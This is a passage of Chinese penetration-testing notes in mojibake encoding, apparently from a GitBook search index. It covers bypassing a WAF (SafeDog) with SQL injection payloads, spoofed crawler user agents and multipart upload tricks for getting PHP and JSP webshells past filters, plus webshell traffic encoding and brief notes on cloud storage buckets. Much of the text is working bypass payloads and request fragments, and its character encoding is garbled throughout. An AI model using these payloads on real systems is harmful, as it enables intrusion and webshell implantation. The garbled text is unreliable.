è™½ç„¶ä¹Ÿæœ‰çœŸå®IPï¼Œä½†æ˜¯åŸŸåèµ°çš„wafè§£æï¼Œä¸å…è®¸IPç›´æ¥è®¿é—® æ€§èƒ½ç¼ºé™· è„æ•°æ® ä¸ºäº†é˜²æ­¢æ¶ˆè€—å¤ªå¤šçš„CPUã€å†…å­˜èµ„æºï¼Œå› æ­¤è®¸å¤šWAFåªæ£€æµ‹å‰é¢çš„2Mæˆ–4Mçš„å†…å®¹ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡å¡«å……åƒåœ¾æ•°æ®è¿›è¡Œç»•è¿‡ã€‚ é™æ€æ–‡ä»¶ç»•è¿‡ ä¸€äº› WAF ä¸ºäº†å‡å°‘æœåŠ¡å™¨çš„å‹åŠ›ï¼Œä¼šå¯¹é™æ€æ–‡ä»¶å¦‚.pngã€.cssç­‰ç›´æ¥æ”¾è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ä¼ªè£…æˆé™æ€æ–‡ä»¶æ¥ç»•è¿‡ # åŸæ¥è¢«æ‹¦æˆª http://a.a/?id=123 and 2*3=6 # ç°åœ¨ä¸æ‹¦æˆª http://a.a/?1.jpg&id=123 and 2*3=6 é«˜å¹¶å‘ ç”¨Burpçš„Trubo Intruderæ’ä»¶,å¤±è´¥ è€Œä¸”é«˜å¹¶å‘å¾ˆå¯èƒ½ä¼šé€ æˆä¸šåŠ¡ç³»ç»Ÿå‡ºç°é—®é¢˜ã€‚ ä¸€ä¸ªæˆåŠŸçš„æ¡ˆä¾‹https://zone.huoxian.cn/d/113 ç™½åå•æœºåˆ¶ æ–‡ä»¶ç™½åå• ä¸€äº› WAF ä¸ºäº†ä¿è¯æ ¸å¿ƒåŠŸèƒ½å¦‚ç™»é™†åŠŸèƒ½æ­£å¸¸ï¼Œä¼šåœ¨å†…éƒ¨è®¾ç«‹ä¸€ä¸ªæ–‡ä»¶ç™½åå•ï¼Œæˆ–å†…å®¹ç™½åå•ï¼Œåªè¦å’Œè¿™äº›æ–‡ä»¶æˆ–å†…å®¹æœ‰å…³ï¼Œæ— è®ºæ€ä¹ˆæµ‹è¯•ï¼Œéƒ½ä¸ä¼šè¿›è¡Œæ‹¦æˆªã€‚ å¦‚ï¼šWAF è®¾ç«‹äº†ç™½åå•/adminï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æµ‹è¯• payload å¯ä»¥é€šè¿‡å¦‚ä¸‹çš„æ‰‹æ³•æ¥ç»•è¿‡ # åŸæ¥è¢«æ‹¦æˆª http://a.a/?id=123 and 2*3=6 # ç°åœ¨ä¸æ‹¦æˆª http://a.a/?a=/admin&id=123 and 2*3=6 IPç™½åå• åç«¯é€šè¿‡Headerå­—æ®µè·å–æºIP X-FORWARDED-FORç­‰ UAç™½åå• æŸäº›WAFå¯èƒ½ä¸ºäº†ä¸å½±å“ç«™ç‚¹çš„SEOä¼˜åŒ–ï¼Œå°†User-Agentä¸ºæŸäº›æœç´¢å¼•æ“ï¼ˆå¦‚è°·æ­Œï¼‰çš„è¯·æ±‚å½“ä½œç™½åå•å¤„ç†ï¼Œä¸æ£€æµ‹å’Œæ‹¦æˆªã€‚ # ç™¾åº¦æœç´¢è€ç‰ˆUA Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html) # ç™¾åº¦å›¾ç‰‡è€ç‰ˆUA Baiduspider-image+(+http://www.baidu.com/search/spider.htm) # æ–°ç‰ˆPC Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html) # æ–°ç‰ˆWAP Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html) # 360æœç´¢ Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0); # 360ç½‘ç«™å®‰å…¨æ£€æµ‹ 360spider (http://webscan.360.cn) # Google Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) # Adwordsç§»åŠ¨ç½‘ç»œ Googlebot-Image/1.0 # Adwordsç§»åŠ¨ç½‘ç»œ AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 3 0 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari # å¾®è½¯ bingï¼Œå¿…åº” Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) # æœç‹—æœç´¢ Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07) è¯·æ±‚æ–¹å¼ ä¸€äº› WAF å¯¹äºgetè¯·æ±‚å’Œpostè¯·æ±‚çš„å¤„ç†æœºåˆ¶ä¸ä¸€æ ·ï¼Œå¯èƒ½å¯¹ POST è¯·æ±‚ç¨åŠ æ¾æ‡ˆï¼Œå› æ­¤ç»™GETè¯·æ±‚å˜æˆPOSTè¯·æ±‚æœ‰å¯èƒ½ç»•è¿‡æ‹¦æˆªã€‚ ä¸€äº› WAF æ£€æµ‹åˆ°POSTè¯·æ±‚åï¼Œå°±ä¸ä¼šå¯¹GETæºå¸¦çš„å‚æ•°è¿›è¡Œè¿‡æ»¤æ£€æµ‹ï¼Œå› æ­¤å¯¼è‡´è¢«ç»•è¿‡ã€‚ æ­£é¢ç¡¬åˆšç±» å¢å¢æ”¹æ”¹æ··æ·†è§†å¬ï¼Œä½¿wafçš„è§„åˆ™å’Œç­–ç•¥å¤±æ•ˆ åŸºæœ¬æ–¹é’ˆï¼š å¢åˆ æµ‹è¯•wafå®¹å¿åº¦ï¼Œç¡®è®¤å…³é”®ç‚¹ FUZZ PAYLOAD,å…ˆä¿è¯å¯ä»¥ç»•è¿‡æ£€æµ‹ å†æ¬¡è¿›è¡Œæ„é€ ä½¿å¾—åç«¯èƒ½å¤Ÿè¿›è¡Œè§£æ FUZZå¤§æ³• fuzzå¤§æ³•ï¼Œä½¿ç”¨è„šæœ¬å»æ¢æµ‹WAFè®¾å¤‡å¯¹äºå­—ç¬¦å¤„ç†æ˜¯å¦æœ‰å¼‚å¸¸ï¼Œä¸€äº›WAFå¯èƒ½ç”±äºè‡ªèº«çš„è§£æé—®é¢˜ï¼Œå¯¹äºæŸäº›å­—ç¬¦è§£æå‡ºé”™ï¼Œé€ æˆå…¨å±€çš„bypass æµ‹è¯•ç‚¹ 1ï¼‰ï¼šgetè¯·æ±‚å¤„ 2ï¼‰ï¼šheaderè¯·æ±‚å¤„ 3ï¼‰ï¼špost urlencodeå†…å®¹å¤„ 4ï¼‰ï¼špost form-dataå†…å®¹å¤„ åŸºç¡€å†…å®¹ 1ï¼‰ç¼–ç è¿‡çš„0-255å­—ç¬¦ 2ï¼‰è¿›è¡Œç¼–ç çš„0-255å­—ç¬¦ 3ï¼‰utf gbkå­—ç¬¦ å®éªŒç¯å¢ƒ--å®‰å…¨ğŸ• æ²¡æœ‰åœ¨ä»£ç ä¸­è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚æœ‰ä¼šè¯´æ˜ã€‚ win 10 php 5.6.9 mysql 5.7.26 apache 2.4.39 safe dog V3.5 é…ç½®å¦‚ä¸‹ï¼Œé™¤äº†CCæ”»å‡»ï¼Œå…¨é˜²æŠ¤ ç‰¹å¾ sqlæ³¨å…¥ç»•è¿‡ å¤šå‚æ•°æ¥æºå®éªŒ $_REQUEST['id'] å¤±è´¥ $_POST['id'] æˆåŠŸ è„æ•°æ®å®éªŒ POST id=1 union select 1,2,3%23 å®‰å…¨ğŸ•åœ¨HTTP BODYä¸­æ£€æµ‹åˆ°äº†å…³é”®å­—ï¼Œç›´æ¥è¿”å›500ã€‚ã€‚ POST a=8172*A&id=-1 union select 1,2,3%23 æ³¨æ„ wafå¯èƒ½ç›´æ¥æ£€æµ‹é•¿åº¦æ¥æ‹¦æˆª å¦‚å®‰å…¨ğŸ•,GETä¸‹æ˜¯ä¸è¡Œçš„ åˆ†å—ä¼ è¾“å®éªŒ æˆåŠŸï¼Œå›¾æ²¡æˆªã€‚ã€‚ æ­£é¢ç»•è¿‡ ç®€å•fuzz å¯ä»¥å‘ç°ä¸ä¼šå¯¹å•ä¸€çš„å…³é”®å­—è¿›è¡Œè¿‡æ»¤ï¼Œä¼šå¯¹ä¸€äº›ç»„åˆè¿›è¡Œè¿‡æ»¤ union selectç»•è¿‡ union (select) UNiOn/*/1/*/select UNiOn--+%02%0d%0aselect #æ³¨é‡Šæ¢è¡Œ ?id=-1 UNiOn/**/select 1,2,3# ?id=-1 UNiOn/*/1/*/select 1,2,3# åœ¨/**/ä¸­æ’å…¥/x/å³å¯ï¼Œxè‡³å°‘ä¸ºä¸€ä¸ªå­—ç¬¦ å‡½æ•°ç»•è¿‡ ?id=-1 union/*/1/*/select 1,2,database()--+ ?id=-1 union/*/1/*/select 1,2,database/**/()--+ FUZZç»“æœ select from ç¡¬åˆšG åˆ†å—ä¼ è¾“ï¼Œè„æ•°æ®ç­‰æˆåŠŸ æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ wafæ£€æµ‹å†…å®¹ è¯·æ±‚çš„url Boundaryè¾¹ç•Œ MIMEç±»å‹ æ–‡ä»¶åç¼€å æ–‡ä»¶å¤´ æ–‡ä»¶å†…å®¹ è®¿é—®æµé‡ æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…äº†è§£ Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl ------WebKitFormBoundary9zWBDx6vAJHGTpAl Content-Disposition: form-data; name=\"upload_file\"; filename=\"shell.php\" Content-Type: image/png ------WebKitFormBoundary9zWBDx6vAJHGTpAl Content-Disposition: form-data; name=\"submit\" submit ------WebKitFormBoundary9zWBDx6vAJHGTpAl-- boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl å®šä¹‰äº†BODYä¸­çš„åˆ†ç•Œçº¿(å› ä¸ºæ˜¯è°·æ­Œæµè§ˆå™¨ï¼Œæ‰€ä»¥åˆ†ç•Œçº¿ä¸º----WebKitFormBoundaryåŠ ä¸Šéšæœºå­—ç¬¦ä¸²) --boundary # å¼€å§‹æ ‡å¿— Content-Disposition: form-data; name=\"upload_file\"; filename=\"shell.php\" Content-Type: image/png æ–‡ä»¶å†…å®¹ --boundary # æ¯ä¸¤ä¸ªåˆ†ç•Œçº¿ä¹‹é—´æ˜¯å…·ä½“çš„å†…å®¹ï¼šæ–‡ä»¶ä¸Šä¼ ï¼Œpostä¼ å‚ Content-Disposition: form-data; name=\"submit\" POSTå†…å®¹ --boundary-- # ç»“æŸæ ‡å¿— æ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ‰‹æ³• ç»•è¿‡åç¼€ Content-Type Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl Content-Type: multipart/XXXXXX; boundary=----WebKxxxxx Content-Type: multipart/; boundary=----WebKxxxxx å¢åŠ å¤šä¸ªboundary phpï¼šå¯ä»¥åœ¨boundaryå‰åæ·»åŠ ä»»æ„å­—ç¬¦ å¤§å°å†™ boundary=boundary=a Content-Disposition Content-Disposition: form-data; name=\"upload_file\"; filename=\"shell.php\" å¤§å°å†™ # Content-Disposition Content-Disposition ä»»æ„ä½ç½®æ¢è¡Œ,ç©ºæ ¼ï¼Œè„æ•°æ®æº¢å‡º å¤šä¸ªContent-Disposition form-dataåˆ é™¤ï¼Œæ”¹ä¸º* # filename å¤šä¸ªfilenameï¼Œå¤šä¸ª; æ–‡ä»¶åå•åŒå¼•å·æ•°é‡ filenameå­—ç¬¦å·¦å³å¯ä»¥åŠ ä¸Šä¸€äº›ç©ºç™½å­—ç¬¦%20 %09 %0a %0b %0c %0d %1c %1d %1e %1f æ’å…¥è½¬ä¹‰å­—ç¬¦ content-typeï¼ˆå¢åˆ ï¼Œè®¾ç½®charsetï¼‰ å¤šä¸ªBODY å¤šä¸ªboundary äº¤æ¢nameå’Œfilenameçš„é¡ºåº æ’åˆ—ç»„åˆ Windows NTFS æµ æ–‡ä»¶æµ (æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ) - Win32 apps | Microsoft Learn fuzzå¯ä»¥çš„ ::$DATA ::$INDEX_ALLOCATION æ–‡ä»¶å æ–‡ä»¶åå°¾åŠ ä»»æ„ä¸ª. æˆ–è€…ä»»æ„ä¸ªç©ºæ ¼ï¼ˆå¯¹æ–‡ä»¶åæ— å½±å“ï¼‰ windowsæ–‡ä»¶åçš„ä¿ç•™å­—ç¬¦ï¼ˆä¸å…è®¸å‡ºç°ï¼‰ \\/:*?\" <>| å¯ä»¥å°è¯•åœ¨æ–‡ä»¶åååŠ ä¸Šè¿™äº›å­—ç¬¦ å½“filename=shell.php:.jpg ç»“æœï¼š å¯ä»¥ä¸Šä¼ shell.phpï¼Œä½†æ˜¯ä¼šåƒæ‰æ–‡ä»¶å†…å®¹ã€‚ã€‚ã€‚ å…¶ä»–çš„è¦ä¸ä¸å¯ä»¥ï¼Œå¯ä»¥çš„è¯ï¼Œä¸Šä¼ çš„æ–‡ä»¶åä¸º.jpg æ–‡ä»¶åé•¿åº¦ æˆªæ–­è¶…é•¿æ–‡ä»¶å windowsæ–‡ä»¶å linuxæ–‡ä»¶åï¼šlinuxä¸­æ–‡ä»¶åæœ€é•¿ä¸º255å­—ç¬¦ï¼Œæ–‡ä»¶è·¯å¾„æœ€å¤§é•¿åº¦ä¸º4096å­—ç¬¦ å¦‚æœåç«¯è„šæœ¬æ²¡æœ‰é™åˆ¶ä¸Šä¼ æ–‡ä»¶åé•¿åº¦ï¼Œå¯ä»¥é€šè¿‡å¤šæ¬¡æµ‹è¯•ï¼Œä¸Šä¼ åä¸ºaaaaaâ€¦(200+).php.jpgï¼ŒæŠŠæœ€åçš„.jpgæŒ¤å‡ºå»ã€‚ ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹--å…æ€ wafæ£€æµ‹ å†…å®¹ã€åˆ›å»ºæ—¥æœŸã€æ–‡ä»¶å¤§å°ã€é€šä¿¡æµé‡ç‰¹å¾ å¯¹äºé™æ€å¼•æ“çš„ç»•è¿‡ï¼Œå¯ä»¥é€šè¿‡æ‹†åˆ†å…³é”®è¯ã€ åŠ å…¥èƒ½å¤Ÿå¼•å‘è§£æå¹²æ‰°çš„ç•¸å½¢å­—ç¬¦ç­‰; è€Œå¯¹äºåŠ¨æ€å¼•æ“ï¼Œéœ€è¦åˆ†æå®ƒè·Ÿè¸ªäº†å“ªäº›è¾“å…¥ ç‚¹ï¼Œåˆæ˜¯å¦‚ä½•è·Ÿè¸ªå˜é‡çš„ï¼Œæœ€ç»ˆæ˜¯åœ¨å“ªäº›å‡½æ•°çš„å“ªäº›å‚æ•°å‘½ä¸­äº†æ¶æ„æ ·æœ¬è§„åˆ™ ç®€å•ç†è§£æ±¡ç‚¹åˆ†ææŠ€æœ¯ | K0rz3n's Blog å¦ç±»çš„å…¥å£ å„ç§æ··æ·†ï¼ˆç¼–ç åŠ å¯†ï¼Œè¿›åˆ¶è½¬æ¢ï¼Œååºåˆ—åŒ–...ï¼‰ ç¬¦å·å¹²æ‰°ï¼Œç»•è¿‡æ­£åˆ™ï¼Œæ‹¼æ¥null,\\n,\\r,\\tç­‰ ä¿¡æ¯å·®ç»•è¿‡ï¼ˆåŠ å…¥å¤–éƒ¨å› ç´ åæ‰æ˜¯webshelï¼Œé‡å­WEBshellğŸ˜‹ï¼‰æ¯”å¦‚æˆªå–æ–‡ä»¶åï¼Œç›®å½•åï¼Œä¼ å…¥éšæœºæ•°ç§å­ç­‰ ä¼ ç»Ÿwebshell å­¦ä¹ ï¼š WebShellé€šç”¨å…æ€çš„æ€è€ƒ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/ ä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒ æ”¶é›†ï¼š https://github.com/tennc/webshell ç»•è¿‡æµé‡æ£€æµ‹--ç‰¹å¾/é€šä¿¡åŠ å¯† å¼±ç‰¹å¾ï¼šHTTP Header requestå’Œresponseå†…å®¹ å‚è€ƒä¹‹å‰HWçœ‹çš„æ–‡ç«  å“¥æ–¯æ‹‰ ã€åŸåˆ›ã€‘å“¥æ–¯æ‹‰GodzillaåŠ å¯†æµé‡åˆ†æ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· å†°è åˆ©ç”¨åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†å®ç°æ–°å‹ä¸€å¥è¯æœ¨é©¬ä¹‹Javaç¯‡ - å…ˆçŸ¥ç¤¾åŒº å†°èV4.0æµé‡åˆ†æåˆ°æ”»é˜²æ£€æµ‹ - SecPulse.COM | å®‰å…¨è„‰æ å†°è4.0è‡ªå®šä¹‰åŠ å¯† - å…ˆçŸ¥ç¤¾åŒº èšå‰‘ https://www.yuque.com/antswordproject/antsword/yuakxl å®‰å…¨ğŸ•æ£€æµ‹å†…å®¹ ä¸å…è®¸phpåç¼€ä¸Šä¼  ä¸Šä¼ æ—¶ï¼Œä¸æ£€æŸ¥æ–‡ä»¶å†…å®¹ è®¿é—®æ—¶ï¼Œä¸å…è®¸è®¿é—®å«æœ‰æ¶æ„å†…å®¹çš„phpæ–‡ä»¶ éƒ¨åˆ†æˆåŠŸçš„ åç¼€ç»•è¿‡ wafæ˜¯è§£ææœ€åä¸€ä¸ªå‚æ•°ï¼Œæœ€åä¸€ä¸ª;åé¢çš„ï¼Œä½†æ˜¯å¦‚æœæœ€åä¸€ä¸ªï¼›åé¢æ²¡æœ‰å‚æ•°ï¼Œ åç«¯å°±å–å‰ä¸€ä¸ª,wafè¯†åˆ«åˆ°ç©º filename=shell.php; filename='shell.php'; # åŒå¼•å·ä¸è¡Œ Content-Disposition: form-data; name=\"upload_file\";filename=shell.php é™¤äº†shell.phpå¤„ï¼Œå…¶ä»–åœ°æ–¹åŠ æ¢è¡Œï¼Œæˆ–è„æ•°æ®éƒ½å¯ åˆ é™¤content-type å¢åŠ boundary å®‰å…¨ğŸ•+ä»£ç ç™½åå•ï¼ˆåç¼€åªå…è®¸å›¾ç‰‡ï¼‰ ä¸Šé¢ä»»æ„ä¸€ä¸ªç»•è¿‡ï¼ˆé™¤äº†ï¼›ç»•è¿‡ï¼‰+ filename=shell.php::$DATA.jpg å†…å®¹æ£€æµ‹ç»•è¿‡ å®‰å…¨ğŸ•çš„å†…å®¹æ£€æµ‹éšä¾¿æ”¹ä¸€ä¸‹å°±è¿‡äº†ã€‚ æµé‡æ£€æµ‹ç»•è¿‡ system(\"xxx\") #å‘½ä»¤æ‰§è¡Œé™åˆ¶ å¯¹æµé‡è¿›è¡Œä¸€ä¸ªbase64åŠ å¯†å³å¯ webshell èšå‰‘ ç¼–ç å™¨ data[pwd] = Buffer.from(data['_']).toString('base64'); é€‰æ‹©ç¼–ç å™¨ JAVAæ–‡ä»¶ä¸Šä¼ ç»•è¿‡è¡¥å…… commons-fileuploadç»„ä»¶--QPç¼–ç  org.apache.commons.fileuploadå¯¹ä¼ å…¥çš„å€¼è¿›è¡Œäº†MimeUtility.decodeTextæ“ä½œ ä¸ºäº†ç¬¦åˆRFC 2047è§„èŒƒä¼šå°† è¦æ±‚ä»¥=?å¼€å¤´ ä¹‹åè¦æ±‚è¿˜è¦æœ‰ä¸€ä¸ª?ï¼Œä¸­é—´çš„å†…å®¹ä¸ºç¼–ç ï¼Œä¹Ÿå°±æ˜¯=?charset? è·å–ä¸‹ä¸€ä¸ª?é—´çš„å†…å®¹ï¼Œè¿™é‡Œä¸ä¸‹é¢çš„ç¼–è§£ç æœ‰å…³ ä¹‹åå®šä½åˆ°æœ€åä¸€ä¸ª?=é—´å†…å®¹æ‰§è¡Œè§£ç  ä¾‹å­ =?gbk?Q?=31=2e=6a=73=70?= Bï¼ŒQï¼Œåˆ†åˆ«å¯¹åº”Base64ä»¥åŠQuoted-printableç¼–ç  Quoted-printableå°†ä»»ä½•8-bitå­—èŠ‚å€¼å¯ç¼–ç ä¸º3ä¸ªå­—ç¬¦ï¼šä¸€ä¸ªç­‰å·â€=â€åè·Ÿéšä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—(0â€“9æˆ–Aâ€“F)è¡¨ç¤ºè¯¥å­—èŠ‚çš„æ•°å€¼ã€‚ä¾‹å¦‚ï¼ŒASCIIç æ¢é¡µç¬¦ï¼ˆåè¿›åˆ¶å€¼ä¸º12ï¼‰å¯ä»¥è¡¨ç¤ºä¸ºâ€=0Câ€ï¼Œ ç­‰å·â€=â€ï¼ˆåè¿›åˆ¶å€¼ä¸º61ï¼‰å¿…é¡»è¡¨ç¤ºä¸ºâ€=3Dâ€ï¼Œgb2312ä¸‹â€œä¸­â€è¡¨ç¤ºä¸º=D6=D0 Payload boundary==?gbk?Q?=2d=2d=2d=2d=57=65=62=4b=69=74=46=6f=72=6d=42=6f=75=6e=64=61=72=79=54=79=42=44=6f=4b=76=61=6d=4e=35=38=6c=63=45=77?= è§£ç å boundary=----WebKitFormBoundaryTyBDoKvamN58lcEw è§£ç æ—¶åªä¼šæå–=??=ä¹‹é—´çš„å†…å®¹ï¼Œæ‰€ä»¥å¯ä»¥åœ¨æœ€åæ’å…¥æ··æ·†å­—ç¬¦ å¤„ç†è¿‡ç¨‹ä¸­è¿˜æœ‰å¯¹\\t\\r\\nçš„å¤„ç† å¯ä»¥å°†æ–‡ä»¶åæ‹†åˆ†å¹¶æ’å…¥\\t\\r\\n Tomcatä¸Springæ–‡ä»¶ä¸Šä¼  å¦‚æœé¦–ä½æ˜¯\"(å‰ææ¡ä»¶æ˜¯é‡Œé¢æœ‰\\å­—ç¬¦)ï¼Œé‚£ä¹ˆå°±ä¼šå»æ‰\"ï¼Œä»ç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹å–å€¼ï¼Œå¹¶ä¸”æœ«å°¾ä¹Ÿä¼šå¾€å‰ç§»åŠ¨ä¸€ä½ï¼ŒåŒæ—¶ä¼šå¿½ç•¥å­—ç¬¦\\ filename=\"y4\\.jspZ filename=\"1.txt\\\".jsp\" Content-Disposition: form-data*;;;;;;;;;;name*=\"UTF-16BE'Y4tacker'%00d%00e%00p%00l%00o%00y%00W%00a%00r\";;;;;;;;filename*=\"UTF-16BE'Y4tacker'%00%22%00y%00%5C%004%00.%00%5C%00w%00%5C%00a%00r%00K\" # Spring5æ”¯æŒçš„ç¼–ç UTF-8/ISO-8859-1/US_ASCII filename*=utf8'das'1.jsp filename*=utf8\"das\"1.jsp filename*=utf8\"das\"1.jsp;sd=1 filename*=\"utf8'das'1.jsp\" filename*=\"utf8'das'1.jsp\";;;;asdsad; # å†åŠ urlç¼–ç  filename*=utf8\"das\"1.js%70;sd=1 filename=1.jsp;.txt; filename=\"1.txt\".jsp;txt; # å¤šä¸ªfilenameç»„åˆç»•è¿‡ filename=\"1.txt\";filename*=\"UTF-8\"'sad'%32%2e%6a%73%70 #%32%2e%6a%73%70â†’2.jsp z=\"filename=\"1.jsp\"\";filename=\"1.txt\" z=\"filename=1.jsp;\";filename=\"1.txt\" Druid SQL https://www.cnblogs.com/HighnessDragonfly/p/14821624.html https://www.modb.pro/db/587040 å‚è€ƒæ–‡ç«  https://xz.aliyun.com/t/12684 æˆ‘çš„WafBypassä¹‹é“ï¼ˆSQLæ³¨å…¥ç¯‡ï¼‰ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) æ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ€è·¯æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) Bypass WAF Cookbook - MayIKissYou (wooyun.js.org) WAFæ˜¯å¦‚ä½•è¢«ç»•è¿‡çš„ï¼Ÿ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com) ç„æ­¦ç›¾çš„å‡ ç§ç»•è¿‡å§¿åŠ¿ - å…ˆçŸ¥ç¤¾åŒº Javaæ–‡ä»¶ä¸Šä¼ å¤§æ€å™¨-ç»•waf(é’ˆå¯¹commons-fileuploadç»„ä»¶) | Y4tacker's Blog/) æ¢å¯»Tomcatæ–‡ä»¶ä¸Šä¼ æµé‡å±‚é¢ç»•wafæ–°å§¿åŠ¿ | Y4tacker's Blog æ¢å¯»Javaæ–‡ä»¶ä¸Šä¼ æµé‡å±‚é¢wafç»•è¿‡å§¿åŠ¿ç³»åˆ—äºŒ | Y4tacker's Blog Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-28 19:02:50 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/å…¶ä»–.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/å…¶ä»–.html","title":"å…¶ä»–","keywords":"","body":"äºŒç»´ç åŠ«æŒ URLè·³è½¬ Ddosæ”»å‡»æ¼æ´ https://xz.aliyun.com/t/15258?time__1311=GqjxnD0D2GAxlhz30%3DGODRQQF%2B%2B7hDWumD#toc-2 å›¾å½¢éªŒè¯ç ç”Ÿæˆ æŸ¥è¯¢æ¡æ•° å›¾ç‰‡è½¬Base64å½¢å¼å­˜å‚¨ éšç§åˆè§„æ¼æ´ éœ€è¦å¯¹éšç§æ”¿ç­–è¿›è¡Œè§£è¯»ï¼Œæ˜ç¡®å¯¹æ–¹æ˜¯è¿åäº†å“ªä¸€æ¡å›½å®¶åˆ¶å®šçš„æ”¿ç­– vivoéšç§åˆè§„æ¼æ´è¯„åˆ†è§„åˆ™v1.0 æµ…æSRCä¸­çš„éšç§åˆè§„æ¼æ´æŒ–æ˜ä¸¨å¹³å®‰SRCçº¿ä¸Šæ²™é¾™ç¬¬ä¸‰æœŸ - éšç§åˆè§„ä¸“åœºä¸¨æ¼æ´é“¶è¡Œç›´æ’­é—´_å“”å“©å“”å“©_bilibili PPTå¦‚ä¸‹ æ°´æ°´æ´ jqueryç‰ˆæœ¬è¿‡ä½ ä¸­é—´ä»¶ç‰ˆæœ¬ä¿¡æ¯æ³„éœ² ç‚¹å‡»åŠ«æŒæ¼æ´ ä¼šè¯å›ºå®šæ¼æ´ ç»å¯¹è·¯å¾„ä¿¡æ¯æ³„éœ² æŠ¥é”™ä¿¡æ¯æ³„éœ²ï¼ˆæ•°æ®åº“ï¼Œç»„ä»¶ä¿¡æ¯ï¼‰ æ•°æ®å¼ºè½¬ è¯·æ±‚æ–¹æ³• ä¸åˆæ³•å­—ç¬¦ å¤šç‚¹è®¤è¯ç¼ºé™· ä¼šè¯æœªæ³¨é”€ ipåœ°å€ä¼ªé€  ä¸å®‰å…¨çš„httpæ–¹æ³• é»˜è®¤é¡µé¢æ£€æµ‹ï¼›é»˜è®¤ç®¡ç†æ§åˆ¶å° csvæ³¨å…¥https://www.cnblogs.com/M0urn/articles/17761207.html sourcemapè¿˜åŸjsä»£ç  æ–°ç”¨æˆ·ä½¿ç”¨é»˜è®¤å¯†ç  ä¼šè¯æœ‰æ•ˆæ—¶é—´è¿‡é•¿ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-29 20:14:39 "},"01.æ¸—é€æµ‹è¯•/03.äº‘å®‰å…¨/äº‘å®‰å…¨.html":{"url":"01.æ¸—é€æµ‹è¯•/03.äº‘å®‰å…¨/äº‘å®‰å…¨.html","title":"äº‘å®‰å…¨","keywords":"","body":" å¯¹è±¡å­˜å‚¨æœåŠ¡--å­˜å‚¨æ¡¶Bucket å¯ä»¥å…³æ³¨ä¸€ä¸‹é™æ€æ–‡ä»¶æ˜¯ä¸æ˜¯ä»å…¶ä»–åŸŸåå¼•å…¥çš„ï¼Œä¸€èˆ¬ä»å…¶ä»–åŸŸåå¼•å…¥çš„å°±æ˜¯ä»å­˜å‚¨æ¡¶å¼•å…¥çš„ã€‚ è¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯è—åœ¨å¤šçº§ç›®å½•ä¸‹ï¼Œæ¯”å¦‚/minio/picture/ Bucket çˆ†ç ´ åˆ©ç”¨åœºæ™¯ï¼šè®¿é—®æ—¶è¿”å›InvalidBucketName åŸç† å­˜å‚¨æ¡¶åœ°å€ï¼šBucketåç§°-Bucketåœ°åŒº-äº‘å‚å•† å½“å­˜å‚¨æ¡¶ä¸å­˜åœ¨æ—¶æœ‰ä¸¤ç§è¿”å›æƒ…å†µï¼Œåˆ†åˆ«æ˜¯ InvalidBucketName å’Œ NoSuchBucket å½“å­˜å‚¨æ¡¶å­˜åœ¨æ—¶åªä¼šæ ¹æ®æ˜¯å¦å¯è¯»è¿”å›å­˜å‚¨æ¡¶ä¸­çš„æ–‡ä»¶ â€‹ æƒé™æ§åˆ¶ACLé…ç½®ä¸å½“ å…¬å…±è¯»ï¼ˆåŒ…å«ListObjectæ“ä½œ--ç›¸å½“äºåˆ—ç›®å½•ï¼‰ ossx-mainçˆ¬å–é“¾æ¥+wgetæ‰¹é‡ä¸‹è½½ å…¬å…±è¯»å†™ PUTä¸Šä¼ æ–‡ä»¶ Bucket Policyå…è®¸å…¬å…±è®¿é—® è®¿é—®/?aclï¼Œè·å–ç­–ç•¥å¹¶æ 